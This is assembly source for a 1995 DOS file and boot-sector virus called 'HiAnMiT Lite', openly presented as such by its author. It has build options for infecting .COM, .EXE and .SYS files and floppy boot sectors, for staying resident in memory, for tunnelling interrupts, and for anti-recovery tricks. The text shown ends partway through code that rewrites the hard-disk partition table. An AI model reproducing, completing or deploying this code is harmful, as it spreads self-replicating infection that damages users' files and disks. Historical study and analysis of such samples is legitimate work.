;                      Name: HiAnMiT Lite
;                     ('high and mighty.')
;                      Author:  roy g biv
;                  Initial size:  1,910 bytes
;                  Passive trace:   +70 bytes
;                  Piggybacking:    +66 bytes
;                  Anti-recovery:   +33 bytes
;                  Tiny load:       +21 bytes
;                  .SYS infect:    +193 bytes
;                  Boot infect:    +142 bytes (standard)
;                       or:    +146 bytes (passive)
;                  UMB resident:    +87 bytes (standard)
;                        or:    +75 bytes (.SYS infect)

;               Copyright (C) 1995 by Defjam Enterprises
;           Greetings to Prototype, Obleak, and The Gingerbread Man

;               To contact Defjam Enterprises, write to:
;               roy g biv       The Gingerbread Man
;             (programming)       (miscellaneous)
;                    P.O. Box 457,
;                     Bexley, NSW
;                   2207  AUSTRALIA

;                     DECLARATIONS

false       equ 0       ;to assist the readability of if statements
true        equ 1       ;well, anything other than 0 will suffice


;                        OPTIONS
res_umb     equ false       ;if true, go resident in UMBs
inf_boot    equ false       ;if true, infect boot sectors of floppies
inf_sys     equ false       ;if true, infect .SYS, .BIN, and .OVL, files
tiny_load       equ false       ;if true, use tiny bootsector/partition code
anti_rec    equ false       ;if true, use anti-recovery techniques
anti_pig    equ false       ;if true, use anti-anti-piggybacking techniques

passive     equ false       ;if true, use passive interrupt 1 tracing
;enable this switch ONLY if you have good reason to.  Windows, Debug, and
;anything else that loads overlays, will unhook the viral code until they
;terminate, which means no infection, and more importantly, no disinfection.
;the only advantage to using this switch is that it traces by segment number,
;instead of code comparison, which means that it can trace any interrupt.






;                        STUBS

;            if inf_sys is enabled, a stub must be selected
;            (stub_com is chosen as a default, if none are enabled)
;            (otherwise the first 3 bytes of code are overwritten!)

stub_com    =   false       ;if true, use .COM format as initial stub
stub_exe    equ false       ;if true, use .EXE format as initial stub
stub_sys    equ false       ;if true, use .SYS format as initial stub
                ;(must enable inf_sys first!)










ife     inf_sys
  ife     res_umb
    int12h_flag equ 1       ;this cannot be altered without size increase!  ;toggle value when hooked
    val02h_flag equ 2       ;unused
  else
    useumb_flag equ 1       ;this cannot be altered without size increase!  ;toggle value when used
    int12h_flag equ 2       ;this cannot be altered without size increase!  ;toggle value when hooked
  endif
else
  device_flag   equ 1       ;this cannot be altered without size increase!  ;toggle value when used
  int12h_flag   equ 2       ;this cannot be altered without size increase!  ;toggle value when hooked
endif

suffix_flag     equ 4                               ;non-executable suffix (neither .COM nor .EXE)
val08h_flag     equ 8       ;unused
val10h_flag     equ 10h     ;unused
val20h_flag     equ 20h     ;unused
val40h_flag     equ 40h     ;unused

if      passive
  int21h_flag   equ 80h     ;this cannot be altered without size increase!  ;toggle value when executing
endif

;                     COMMENTS AT COLUMN 81

code_byte_c     equ offset code_end-offset begin                ;true code size
code_word_c     equ (code_byte_c+1)/2                       ;code size rounded up to next word
stack_byte_c    equ code_byte_c+80h                         ;code size plus 128-byte stack
total_byte_c    equ total_end                           ;resident code size
code_kilo_c     equ (total_byte_c+3ffh)/400h                    ;resident code size in kilobytes
code_sect_c     equ (old_part+1ffh)/200h                    ;true code size in sectors
com_byte_c      equ 0ffffh-stack_byte_c                     ;largest infectable .COM file size
code_resp_c     equ code_kilo_c*40h                         ;resident code size in paragraphs

;                         CODE

.model  tiny
.386
.code

org     100h

stub:
if      stub_com
    db      0e9h,0,0
else
  if      stub_exe
    db      "MZ"
    dw      (offset code_end-offset stub) and 1ffh
    dw      (offset code_end-offset stub+1ffh)/200h
    dw      0
    dw      2
    dw      0
    dw      0ffffh
    dw      0fff0h
    dw      stack_byte_c+offset begin-offset host+100h
    db      "GM"
    dw      offset begin-offset host+100h
    dw      0fff0h
    db      ""

host:   int     20h
    db      0
  else
    if      inf_sys
      ife     stub_sys
stub_com  =     true
    db      0e9h,0,0
      else
    dd      0ffffh
    dw      8000h
    dw      offset begin-offset stub
    dw      offset interrupt-offset stub
    db      "roygbiv!"

strategy:
    mov     word ptr cs:[offset old_bx-offset stub],bx
    mov     word ptr cs:[offset old_es-offset stub],es
    retf

old_bx  dw      0
old_es  dw      0

interrupt:
    push    ds
    push    bx
    lds     bx,dword ptr cs:[offset old_bx-offset stub]
    mov     word ptr ds:[bx+3],8003h
    push    cs
    push    0
    pop     dword ptr ds:[bx+0eh]
    pop     bx
    pop     ds
    retf
      endif
    endif
  endif
endif

begin:

if      inf_sys
    push    cs                                  ;save CS on stack
    push    100h                                ;save default return offset on stack
    push    ds                                  ;save DS on stack
    push    es                                  ;save ES on stack
    pusha                                   ;save all registers on stack
endif

    call    file_load                               ;save initial offset on stack

file_load:

ife     inf_sys
    pop     si                                  ;calculate delta offset
    sub     si,offset file_load-offset begin                ;point to absolute start of code
                                        ;only pussy programs rely on initial register values
else
    pop     bp                                  ;calculate delta offset
    sub     bp,offset file_load-offset begin                ;point to absolute start of code
    push    cs                                  ;save CS on stack
    pop     ds                                  ;restore CS from stack
    lea     si,word ptr [bp+offset exe_buffer-offset begin]         ;point to original code
    mov     ax,word ptr ds:[si]                         ;retrieve file type
    cmp     ax,"ZM"                             ;check file type
    pushf                                   ;save file type on stack
    jz      restore_exe                             ;branch if .EXE file
    inc     ax                                  ;check file type
    jnz     restore_com                             ;branch if not .SYS file
    mov     di,6                                ;offset of strategy offset in header
    add     si,di                               ;point to strategy offset in header
    push    word ptr ds:[si]                        ;save original strategy offset on stack
    mov     bx,sp                               ;point BX to current top of stack
    pop     word ptr ss:[bx+18h]                        ;save original interrupt offset on stack
    push    cs                                  ;save CS on stack
    pop     es                                  ;restore CS from stack
    db      80h                                 ;dummy operation to mask MOV and MOVSB

restore_com:
    mov     di,100h                             ;.COM files always start at 100h
    movsb
    movsw                                   ;restore original 3 bytes of .COM file
    jmp     check_inst                              ;branch to check if resident

restore_exe:
    add     si,0eh                              ;point to stack segment in header
    mov     di,es                               ;move PSP segment into DI
    add     di,10h                              ;point to first allocated segment
    lodsw                                   ;retrieve stack segment
    add     ax,di                               ;relocate for actual memory segment
    xchg    dx,ax                               ;move stack segment into DX
    lodsw                                   ;retrieve stack pointer
    xchg    cx,ax                               ;move stack pointer into CX
    lodsw                                   ;skip checksum (waste of 2 bytes!)
    lodsw                                   ;retrieve instruction pointer
    xchg    bx,ax                               ;move intruction pointer into BX
    lodsw                                   ;retrieve code segment
    add     ax,di                               ;relocate for actual memory segment
    pop     di                                  ;restore file type from stack
    add     sp,0ah                              ;discard 0ah bytes from stack
    push    ax                                  ;save code segment on stack
    push    ax                                  ;save AX on stack
    push    bx                                  ;save instruction pointer on stack
    push    cx                                  ;save stack pointer on stack
    push    dx                                  ;save stack segment on stack
    push    di                                  ;save file type on stack

check_inst:
endif

    mov     ax,1badh                ;one            ;call sign
    int     13h                     ;bad            ;check if resident
    cmp     ax,0deedh                   ;deed!          ;return sign if resident
    jnz     go_resident                             ;branch if not resident

file_end:

ife     inf_sys
    push    cs                                  ;save code segment on stack
    pop     ds                                  ;restore code segment from stack
    add     si,offset exe_buffer-offset begin                   ;point to original code
    cmp     word ptr ds:[si],"ZM"                       ;check file type
    jz      exec_exe                            ;branch if .EXE file
    mov     di,100h                             ;.COM files always start at 100h
    push    es                                  ;save PSP segment on stack
    push    di                                  ;save return address on stack
                                        ;(simulate far call)
    movsb
    movsw                                   ;restore original 3 bytes of .COM file
    jmp     fix_registers                           ;branch to restore registers

exec_exe:
    add     si,0eh                              ;point to stack segment in header
    mov     di,es                               ;move PSP segment into DI
    add     di,10h                              ;point to first allocated segment
    lodsw                                   ;retrieve stack segment
    add     ax,di                               ;relocate for actual memory segment
    xchg    dx,ax                               ;move stack segment into DX
    lodsw                                   ;retrieve stack pointer
    xchg    cx,ax                               ;move stack pointer into CX
    lodsw                                   ;skip checksum (waste of 2 bytes!)
    lodsw                                   ;retrieve instruction pointer
    xchg    bx,ax                               ;move intruction pointer into BX
    lodsw                                   ;retrieve code segment
    add     ax,di                               ;relocate for actual memory segment
    mov     ss,dx                               ;restore original stack segment
    mov     sp,cx                               ;restore original stack pointer
    push    ax                                  ;save original code segment on stack
    push    bx                                  ;save original instruction pointer on stack
                                        ;(simulate far call)
fix_registers:
    push    es                                  ;save PSP segment on stack
    pop     ds                                  ;restore PSP segment from stack
else
    popf                                    ;restore flags from stack
    popa                                    ;restore all registers from stack
    pop     es                                  ;restore ES from stack
    pop     ds                                  ;restore DS from stack
    jnz     host_retf                               ;branch if not .EXE file
    mov     ss,di                               ;restore original stack segment
    mov     sp,si                               ;restore original stack pointer
    push    bx                                  ;save original code segment on stack
    push    bp                                  ;save original instruction pointer on stack
                                        ;(simulate far call)
host_retf:
endif

    retf                                    ;return from far call
                                        ;(execute host file code)
    db      "HiAnMiT - roy g biv"

;             don't be lame - add your name, but don't alter mine!

go_resident:

if      inf_sys
    cmp     word ptr cs:[bp+offset exe_buffer-offset begin],0ffffh      ;check file type
    jnz     exec_alloc                              ;branch if .SYS file
    mov     si,cs                               ;save CS in SI
    lodsw                                   ;allow for size of header
    lea     ax,word ptr [si+(total_byte_c+0fh)/10h]             ;allow for number of paragraphs and header
    mov     es,ax                               ;set destination segment
    push    es                                  ;save initial segment on stack
    push    bp                                  ;save initial offset on stack
    push    si                                  ;save destination code segment on stack
    push    offset fhook_interrupts-offset begin                ;save destination offset on stack
    lea     si,word ptr [bp+code_byte_c-1]                  ;point to last byte in code
    mov     di,si                               ;set destination offset
    lea     ax,word ptr [si+offset relocate-offset code_end+1]          ;calculate return offset
    push    es                                  ;save return segment on stack
    push    ax                                  ;save return offset on stack
    sub     ax,offset relocate-offset pop_length                ;calculate return offset
    push    ax                                  ;save return offset on stack
    push    es                                  ;save return segment on stack
    push    ax                                  ;save return offset on stack
    push    offset code_end-offset pop_length                   ;save byte count on stack
    std                                     ;set index direction to backward

pop_length:
    pop     cx                                  ;restore byte count from stack
    db      0b4h                                ;dummy operation to mask CS:

move_cs:db      2eh                                 ;CS:
                                        ;(to avoid having to save and set DS)
move_code:
    repz    movsb                               ;move code
    retf                                    ;return from far call
                                        ;(continue execution in destination segment)
relocate:
    push    ds                                  ;save source segment on stack
    pop     es                                  ;restore source segment from stack
    mov     cx,code_word_c                          ;number of words to move
    mov     si,bp                               ;set source offset
    mov     di,20h                              ;set destination offset
    cld                                     ;set index direction to forward
    db      2eh                                 ;CS:
                                        ;(to avoid having to save and set DS)
    repz    movsw                               ;move code
    inc     cx
    inc     cx                                  ;set loop count to 2
    mov     si,6                                ;offset of strategy handler in device header
    mov     di,new_strategy                         ;offset of area to contain far jump to host
    mov     word ptr ss:[bx+18h],di                     ;save new interrupt offset on stack

store_far:
    mov     al,0eah                             ;set operation to far jump
    push    di                                  ;save offset of far jump to host on stack
    stosb                                   ;store far jump
    movsw                                   ;store offset of original handler
    pop     word ptr ds:[si-2]                          ;restore offset of far jump from stack
    mov     ax,cs                               ;save CS in AX
    stosw                                   ;store code segment
    loop    store_far                               ;branch while handlers remain
    mov     di,old_part                             ;allow for size of header
    retf                                    ;return from far call
                                        ;(continue execution at top of free memory)
exec_alloc:
endif

    mov     ax,es                               ;move PSP segment into AX
    dec     ax                                  ;point to MCB segment
    mov     ds,ax                               ;move MCB segment into DS
    xor     di,di                               ;set destination offset to 0

ife     res_umb
    mov     ax,code_resp_c                          ;paragraph count while resident
else
  if      inf_sys
    mov     si,bp                               ;point to initial offset
  endif
    mov     bp,code_resp_c                          ;paragraph count while resident
;       mov     ax,3306h                            ;subfunction to get true DOS version number
;       int     21h                                 ;get version number
;       inc     al                                  ;add 1 to al
;       jz      normal_alloc                            ;branch if version < 5.00

;   uncomment the above four lines if you want to support DOS v3.xx and 4.xx

    mov     ax,5802h                            ;subfunction to get UMB link state
    int     21h                                 ;get link state
    cbw                                     ;zero AH
    push    ax                                  ;save UMB link state on stack
    mov     ax,5803h                            ;subfunction to set UMB link state
    push    ax                                  ;save subfunction on stack
    mov     bx,1                                ;add UMBs to DOS memory chain
    mov     cx,bx                               ;set loop count to 1
    int     21h                                 ;set UMB link state
    jb      fix_linkstrat                           ;branch if error
    inc     cx                                  ;set loop count to 2
    xor     al,al                               ;subfunction to get memory allocation strategy
    int     21h                                 ;get allocation strategy
    xchg    bx,ax                               ;store allocation strategy in BX
    push    bx                                  ;save allocation strategy on stack
    mov     ah,58h                              ;subfunction to set memory allocation strategy
    push    ax                                  ;save subfunction on stack
    mov     bl,40h                              ;high memory first fit
    int     21h                                 ;set memory allocation strategy
    mov     ah,48h                              ;subfunction to allocate memory
    mov     bx,bp                               ;number of paragraphs to allocate
    int     21h                                 ;allocate memory
    jb      fix_linkstrat                           ;branch if no UMBs available
    mov     es,ax                               ;move new code segment into ES
    dec     ax                                  ;point to MCB segment
    mov     ds,ax                               ;mov MCB segment into DS
    mov     word ptr ds:[di+1],8                        ;store type of memory block (DOS)
    mov     word ptr ds:[di+8],"CS"                     ;store name of memory block (system code)
                                        ;(must call it something!)
fix_linkstrat:
    pop     ax                                  ;restore subfunction from stack
    pop     bx                                  ;restore UMB link state/memory allocation strategy from stack
    pushf                                   ;save flags on stack
    int     21h                                 ;set UMB link state/memory allocation strategy
    popf                                    ;restore flags from stack
    loop    fix_linkstrat                           ;loop while count > 0

  ife     inf_sys
    jnb     move_code                               ;branch if no error
  else
    jnb     get_count                               ;branch if no error
  endif

normal_alloc:
endif

    cmp     byte ptr ds:[di],"Z"                        ;check segment type

ife     inf_sys
  ife     res_umb
    jnz     file_end                            ;branch if not last block in chain
    sub     word ptr ds:[di+3],ax                       ;reduce free memory
    sub     word ptr ds:[di+12h],ax                     ;reduce system memory
  else
    jnz     file_end                            ;branch if not last block in chain
    sub     word ptr ds:[di+3],bp                       ;reduce free memory
    sub     word ptr ds:[di+12h],bp                     ;reduce system memory
  endif
else
    jnz     file_end                            ;branch if not last block in chain
    sub     word ptr ds:[di+3],bp                       ;reduce free memory
    sub     word ptr ds:[di+12h],bp                     ;reduce system memory
endif

;                  an MCB walker uses too much code,
;          just to find out if there's enough memory to go resident.
;                if it's the last block in the chain,
;            there's almost certainly enough memory to go resident.

    mov     es,word ptr ds:[di+12h]                     ;move new top of system memory into ES

ife     inf_sys
move_code:
    push    cs                                  ;save initial code segment on stack
    push    si                                  ;save inital offset on stack
    mov     cx,code_word_c                          ;number of words to move
    db      2eh                                 ;CS:
                                        ;(to avoid having to alter DS)
    repz    movsw                               ;move code to top of system memory
    push    es                                  ;save destination code segment on stack
    push    offset fhook_interrupts-offset begin                ;save destination offset on stack
                                        ;(simulate far call)
                                        ;(say that slowly, so as to not offend)
    retf                                    ;return from far call
                                        ;(continue execution at top of free memory)
else
  ife     res_umb
    mov     si,bp                               ;point to initial offset
  endif

get_count:
    push    cs                                  ;save CS on stack
    push    si                                  ;save initial offset on stack
    push    es                                  ;save destination code segment on stack
    push    offset fhook_interrupts-offset begin                ;save destination offset on stack
    mov     cx,code_word_c*2                        ;number of bytes to move
    jmp     move_cs                             ;branch to move code
endif

fhook_interrupts:

if      passive
    mov     ah,52h                              ;subfunction to get DOS List of Lists
    int     21h                                 ;retrieve segment of LoL
                                        ;(equivalent to code segment of MSDOS.SYS (or equivalent))
endif

    push    cs                                  ;save code segment on stack
    pop     ds                                  ;restore code segment from stack

ife     passive
    mov     byte ptr ds:[offset cmp_subfn-offset begin+2],cl        ;zero subfunction number
else
    mov     word ptr ds:[offset system_seg-offset begin-2],es           ;save system file code segment
endif

    push    cx                                  ;save 0 on stack

ife     inf_sys
  ife     res_umb
;       the following is required to set CX to the correct toggle value,
;              in case you've set a new bit-value for int12h_flag

    ife     int12h_flag-1
    inc     cx                                  ;set toggle switches...
    else
    mov     cl,int12h_flag                          ;set toggle switches...
    endif
  else
    ife     useumb_flag-1
    inc     cx                                  ;set toggle switches...
    mov     ax,cs                               ;move code segment into BP
    cmp     ah,0a0h                             ;check top of free memory segment
    adc     cx,cx                               ;set toggle to allow for UMB use
    else
    mov     cl,int12h_flag                          ;set toggle switches...
    mov     ax,cs                               ;move code segment into BP
    cmp     ah,0a0h                             ;check top of free memory segment
    jb      set_toggle                              ;branch if code not loaded in UMBs
    add     cl,useumb_flag                          ;set toggle to allow for UMB use

set_toggle:
    endif
  endif
else
  ife     device_flag-1
    inc     cx                                  ;set toggle switches...
    cmp     word ptr ds:[offset exe_buffer-offset begin],0ffffh         ;check file type

    if      res_umb
    jnb     set_toggle                              ;branch if code loaded from .SYS file
    mov     ax,cs                               ;move code segment into BP
    cmp     ah,0a0h                             ;check top of free memory segment

set_toggle:
    endif

    adc     cx,cx                               ;set toggle to allow for UMB use
  else
    mov cl,int12h_flag                          ;set toggle switches...
    cmp     word ptr ds:[offset exe_buffer-offset begin],0ffffh         ;check file type

    if      res_umb
    jnb     set_toggle                              ;branch if code loaded from .SYS file
    mov     ax,cs                               ;move code segment into BP
    cmp     ah,0a0h                             ;check top of free memory segment

set_toggle:
    endif

    add cl,device_flag                          ;set toggle to allow for UMB use
  endif
endif

    mov     byte ptr ds:[di+toggle_byte-old_part],cl            ;interrupt 12h already hooked,
                                        ;interrupt 21h not executing
;                    After DOS has loaded,
;             reducing the value returned by interrupt 12h
;              will NOT reduce the available free memory!
;   Therefore, code stored here will be overwritten when COMMAND.COM reloads

    pop     ds                                  ;set DS to 0

ife     passive
    push    offset hook1_cont-offset begin                  ;save offset on stack
                                        ;(simulate subroutine call)
hook_int:
    mov     si,4                                ;offset of interrupt 1 in interrupt table
    push    dword ptr ds:[si]                           ;save original address on stack
    mov     word ptr ds:[si],offset new_1-offset begin              ;store new offset
    lodsw                                   ;skip 2 bytes in source
    mov     word ptr ds:[si],cs                         ;store new code segment
    les     bx,dword ptr ds:[si+7eh]                    ;retrieve address of interrupt 21h handler
    push    es                                  ;save original segment on stack
    push    bx                                  ;save original offset on stack
    pop     dword ptr cs:[offset jfar_21h-offset begin+1]           ;retrieve original address from stack
    mov     ah,51h      ;the operation must have bit 8 (of AX) set      ;retrieve current default drive
                                        ;(dummy call to invoke interrupt 21h)
;                this call does not use any DOS stacks,
;        therefore it can be called even in another interrupt 21h call
else
    push    cs                                  ;save code segment on stack
    pop     es                                  ;restore code segment from stack
    mov     si,4                                ;offset of interrupt 1 in interrupt table
    movsd                                   ;save original address
    mov     bp,offset new_1-offset begin                    ;offset of new interrupt 1 handler
    mov     word ptr ds:[si-4],bp                       ;store new offset
    mov     word ptr ds:[si-2],cs                       ;store new code segment
    lodsd                                   ;add 4 to SI
    push    si                                  ;save offset of interrupt 3 on stack
    movsd                                   ;save original address
    les     bx,dword ptr ds:[si+74h]                    ;retrieve address of interrupt 21h handler
    mov     ah,19h      ;the operation must have bit 8 (of AX) set      ;retrieve current default drive
                                        ;(dummy call to invoke interrupt 21h)
endif

    pushf                                   ;save flags on stack
    push    cs                                  ;save code segment on stack
    push    offset hook21h_cont-offset begin                ;save offset on stack
                                        ;(simulate interrupt call)
call_int1:
    push    ax                                  ;save flags (but with T flag set) on stack
    push    es                                  ;save interrupt handler code segment on stack
    push    bx                                  ;save interrupt handler offset on stack
                                        ;(simulate interrupt call)
new_1:

ife     passive
    push    ds                                  ;save DS on stack
endif

    push    es                                  ;save ES on stack
    pusha                                   ;save all registers on stack

if      passive
    push    0                                   ;save 0 on stack
    pop     es                                  ;set ES to 0
endif

    mov     bp,sp                               ;point to current top of stack

ife     passive
    mov     si,19h                              ;offset of flags in stack
    lds     di,dword ptr ss:[bp+si-5]                       ;retrieve address of next instruction
    mov     eax,dword ptr ds:[di]                       ;retrieve next instruction
    cmp     al,0cfh                             ;check instruction
    jz      set_flags                               ;branch if IRET
    cmp     al,9dh                              ;check instruction
    jnz     check_subfn                             ;branch if not POPF
    lodsw                                   ;point to flags to pop in stack

set_flags:
    or      byte ptr ss:[bp+si],1                       ;set trace flag in flags in stack
    jmp     quit_1                              ;continue with trace

check_subfn:
    cmp     eax,776cfc80h                           ;check instruction
    jnz     quit_1                              ;branch if not CMP AH,6C JA
    mov     dword ptr cs:[offset cmp_subfn-offset begin],eax        ;save subfunction
    push    ds                                  ;save DS on stack
    pop     es                                  ;restore ES from stack
    mov     al,0eah                             ;set operation to far jump
    stosb                                   ;store far jump
    mov     ax,offset int21h_subfn-offset begin                 ;offset of new interrupt 21h handler
    stosw                                   ;store new offset
    mov     al,byte ptr ds:[di+1]                       ;retrieve branch size
    cbw                                     ;convert to word
    xchg    si,ax                               ;store branch size in SI
    mov     ax,cs                               ;save CS in AX
    stosw                                   ;store new code segment
    push    cs                                  ;save CS on stack
    pop     es                                  ;restore ES from stack
    add     si,di                               ;calculate offset of branch
    xchg    di,ax                               ;store new offset in DI
    mov     di,offset jfar_1-offset begin+1                 ;offset of first far jump
    stosw                                   ;store new offset
    mov     ax,ds                               ;save original code segment in AX
    stosw                                   ;store original code segment
    xchg    si,ax                               ;store branch offset in AX
    inc     di                                  ;skip 1 byte in destination
    stosw                                   ;store new offset
    mov     ax,ds                               ;save original code segment in AX
    stosw                                   ;store original code segment
    add     word ptr ss:[bp+14h],5                      ;skip next instruction
else
    std                                     ;set index direction to forward
    lea     si,word ptr [bp+14h]                        ;offset of address of original interrupt address
    mov     di,0eh                              ;offset of interrupt 3 segment in interrupt table
    db      36h                                 ;SS:
                                        ;(to avoid having to save and set DS)
    lodsw                                   ;retrieve new code segment
    stosw                                   ;store new code segment
    db      36h                                 ;SS:
                                        ;(to avoid having to save and set DS)
    movsw                                   ;store new offset
    cmp     ax,"MG"     ;(correct order when dumped)            ;check interrupt code segment
                                        ;(the value here is altered as required)
system_seg:
    ja      quit_1                              ;branch while not correct segment
    mov     si,old_part+2                           ;offset of address of original interrupt 1 address
    scasd                                   ;add 4 to DI
    db      2eh                                 ;CS:
                                        ;(to avoid having to save and set DS)
    movsd                                   ;restore original address of interrupt 1 handler
                                        ;(remap interrupt 3)
endif

quit_1: popa                                    ;restore all registers from stack
    pop     es                                  ;restore ES from stack

ife     passive
    pop     ds                                  ;restore DS from stack
endif

known_iret:
    iret                                    ;return from interrupt

hook21h_cont:

if      passive
    pop     si                                  ;restore offset of interrupt 3 from stack
    push    si                                  ;save offset of interrupt 3 on stack
    push    offset hook1_cont-offset begin                  ;save offset on stack
                                        ;(simulate subroutine call)
hook_int:
endif

    push    cs                                  ;save code segment on stack
    pop     es                                  ;restore code segment from stack

ife     passive
    mov     word ptr ds:[si-2],offset known_iret-offset begin           ;disable interrupt 1 handler
    push    ds                                  ;save DS on stack
    popf                                    ;clear T flag
    pop     dword ptr ds:[si-2]                         ;restore interrupt 1 address from stack
else
    xor     ah,ah                               ;zero AH
    mov     di,offset jfar_21h-offset begin+1                   ;area to store original interrupt 21h address
    push    ds                                  ;save DS on stack
    lds     si,dword ptr ds:[si]                        ;retrieve original interrupt 21h handler address
    lodsb                                   ;retireve first byte of handler
    cmp     al,0ebh                             ;check if DOS=HIGH handler code
    lodsb                                   ;retrieve branch size
    jz      himem                               ;branch if DOS to load high
    dec     si
    dec     si                                  ;point to original offset of handler
    db      0b8h                                ;dummy operation to mask ADD

himem:  add     si,ax                               ;allow for jump
    xchg    ax,si                               ;store new handler offset in AX
    stosw                                   ;save original code offset

;                 this is a really awful kluge
;      (yes, that IS how you spell it - because it's pronounced 'kloog')
;    but it seems to be the only way to allow compatability with HIMEM.SYS
;  (but if you're not using passive tracing, then this code is not included)

    mov     ax,ds                               ;retrieve original code segment
    stosw                                   ;save original code segment
    pop     ds                                  ;restore DS from stack
    cmp     word ptr cs:[bp+offset system_seg-offset new_1-2],ax        ;check segment of system file
    jb      hook_cont                               ;branch if system segment not located
    mov     al,0eah                             ;set opcode to jmp xxxx:xxxx
    mov     di,old21h_code                          ;area to store original 5 bytes of handler
    stosb                                   ;store jump
    mov     ax,offset intro_21h-offset begin                ;offset of new interrupt handler
    stosw                                   ;store offset
    mov     ax,cs                               ;code segment of new interrupt handler
    stosw                                   ;store code segment
    push    offset hook_cont-offset begin                   ;save offset on stack
                                        ;(simulate subroutine call)
hook_interrupt:
    push    ds                                  ;save DS on stack
    push    es                                  ;save ES on stack
    pusha                                   ;save all registers on stack
    push    cs                                  ;save code segment on stack
    pop     ds                                  ;restore code segment of storage area from stack
    mov     cx,toggle_byte-old21h_code                      ;number of bytes to save
    mov     si,old21h_code                          ;area to store original 5 bytes of handler
    les     di,dword ptr ds:[offset jfar_21h-offset begin+1]        ;retrieve original handler address
    cld                                     ;set index direction to forward
    cli                                     ;disable interrupts

set_intadr:
    mov     al,byte ptr es:[di]                         ;retrieve original byte
    movsb                                   ;exchange it with new byte
    mov     byte ptr ds:[si-1],al                       ;store original byte
    loop    set_intadr                              ;branch while bytes remain
                                        ;(stealth-hook interrupt)
    sti                                     ;enable interrupts
    popa                                    ;restore all registers from stack
    pop     es                                  ;restore ES from stack
    pop     ds                                  ;restore DS from stack
    ret                                     ;return from subroutine

hook_cont:
endif

    mov     si,0bch                             ;offset of interrupt 2fh in interrupt table
    mov     di,offset jfar_2fh-offset begin+1                   ;area to store original interrupt 2fh handler
    movsd                                   ;save original address
    mov     word ptr ds:[si-4],offset new_2fh-offset begin          ;store new offset
    mov     word ptr ds:[si-2],cs                       ;store new code segment

known_ret:
    ret                                     ;return from subroutine

hook1_cont:

if      passive
    pop     si                                  ;restore offset of interrupt 3 from stack
    mov     word ptr ds:[si-8],bp                       ;save new offset
    mov     word ptr ds:[si-6],cs                       ;save new code segment
                                        ;(rehook interrupt 1 - it's already been saved)
    push    ds                                  ;save DS on stack
    mov     ax,0f000h                               ;segment of BIOS
    mov     di,offset system_seg-offset begin-2                 ;area to store BIOS segment
    stosw                                   ;store BIOS segment
    mov     al,75h                              ;set opcode to JNZ
    stosb                                   ;store opcode
endif

    push    cs                                  ;save code segment on stack
    pop     ds                                  ;restore code segment from stack
    mov     ah,13h                              ;subfunction to set disk interrupt handler
    mov     bx,offset new_13h-offset begin                  ;offset of new interrupt 13h handler
    mov     byte ptr ds:[bx+offset int13h_branch-offset new_13h-1],offset jfar_13h-offset int13h_branch
                                        ;disable interrupt 13h handler initially...
    mov     dx,bx                               ;offset of new interrupt 13h handler
    int     2fh                                 ;set disk interrupt handler
                                        ;the return value should be pointing to
                                        ;the ROM BIOS, but I'll trace it anyway
    push    cs                                  ;save code segment on stack
    pop     ds                                  ;restore code segment from stack
    mov     di,offset jfar_13h-offset begin+1                   ;area to store original interrupt 13h address
    mov     word ptr ds:[di],bx                         ;save original offset
    mov     word ptr ds:[di+2],es                       ;save original code segment

if      passive
    mov     ah,1        ;the operation must have bit 8 (of AX) set      ;retrieve system status
                                        ;(dummy call to invoke interrupt 13h)
    pushf                                   ;save flags on stack
    push    cs                                  ;save code segment on stack
    call    call_int1                               ;save offset on stack
                                        ;(simulate interrupt call)
    mov     byte ptr ds:[offset system_seg-offset begin],77h        ;change operation from JNZ to JA
    pop     ds                                  ;restore DS from stack
    push    ds                                  ;save DS on stack
    popf                                    ;clear T flag

;               the trace flag must be cleared manually,
;             otherwise severe performance degradation will occur

endif

    pop     bx                                  ;restore initial offset from stack

ife     passive
    pop     ds                                  ;restore initial code segment from stack
    mov     ax,es                               ;save ES in AX
    cmp     ax,0f000h                               ;check BIOS code segment
else
    pop     ax                                  ;restore initial code segment from stack
    push    cs                                  ;save code segment on stack
    pop     es                                  ;restore code segment from stack
    cmp     word ptr ds:[si+2],0f000h                       ;check BIOS code segment
endif

    jnz     no_write                            ;branch if not in ROM

if      passive
    movsd                                   ;save original address
    mov     ds,ax                               ;store initial code segment in DS
endif

    push    ds                                  ;save initial code segment on stack
    pop     es                                  ;restore initial code segment from stack
    mov     ax,201h                             ;read 1 sector

;     the following is required to set CX to the correct sector number,
;           if you've set a new bit-value for int12h_flag

ife     inf_sys
  ife     res_umb
    if      int12h_flag-1
    mov     cl,al                               ;cylinder 0, sector 1
    endif
  else
    mov     cl,al                               ;cylinder 0, sector 1
  endif
else
    mov     cl,al                               ;cylinder 0, sector 1
endif

    mov     dx,80h                              ;side 0 of hard disk

ife     passive
    call    call_13h                            ;read partition table
else
    int     3                                   ;read partition table
                                        ;(interrupt 13h remapped to interrupt 3)
endif

    jb      no_write                            ;branch if error
    mov     cl,4                                ;only 4 possible partitions

ife     passive
    mov     byte ptr cs:[di+offset int13h_branch-offset cont_13h+3],cl      ;enable interrupt 13h handler
else
    mov     byte ptr cs:[di+offset int13h_branch-offset cont_13h-1],cl      ;enable interrupt 13h handler
endif

;  if BIOS code segment is not located in ROM, then something else is loaded
;       (antivirus card, software with anti-tunneling techniques, etc.)
;                  so partition write must not occur

    mov     di,1beh                             ;offset of first partition in partition table

find_hdd:
    cmp     byte ptr ds:[bx+di],dl                      ;check partition type
    jnz     no_part                             ;branch if not active partition
    push    cs                                  ;save code segment on stack
    pop     es                                  ;restore code segment from stack
    lea     si,word ptr [bx+di]                         ;offset of active partition information
    xchg    di,ax                               ;move inter-buffer offset into AX
    mov     di,old_part                             ;area to store active partition offset
    mov     cl,move_isize   ;directive at end of code to calculate this     ;partition information byte-count
    push    cx                                  ;save active partition byte-count on stack
    push    si                                  ;save active partition offset on stack
    repz                                    ;repeat until CX = 0...
    db      move_ptype      ;directive at end of code to calculate this     ;store active partition information
    mov     cl,move_psize   ;directive at end of code to calculate this     ;new partition loader byte-count
    mov     si,bx                               ;offset of partition table
    push    cx                                  ;save partition loader byte-count on stack
    push    si                                  ;save offset of partition table on stack
    repz                                    ;repeat until CX = 0...
    db      move_ptype      ;directive at end of code to calculate this     ;save original partition table loader
    push    ds                                  ;save partition segment on stack
    pop     es                                  ;restore partition segment from stack
    push    cs                                  ;save code segment on stack
    pop     ds                                  ;restore code segment from stack
    mov     word ptr ds:[offset p_offset-offset begin+2],ax         ;store partition information offset

ife     inf_boot
    mov     ax,302h                             ;number of information sets to alter
    mov     si,offset newp_loader-offset begin                  ;move new active partition offset into SI
else
    mov     ax,2                                ;number of information sets to alter
    mov     si,offset newp_loader-offset begin                  ;move new active partition offset into SI
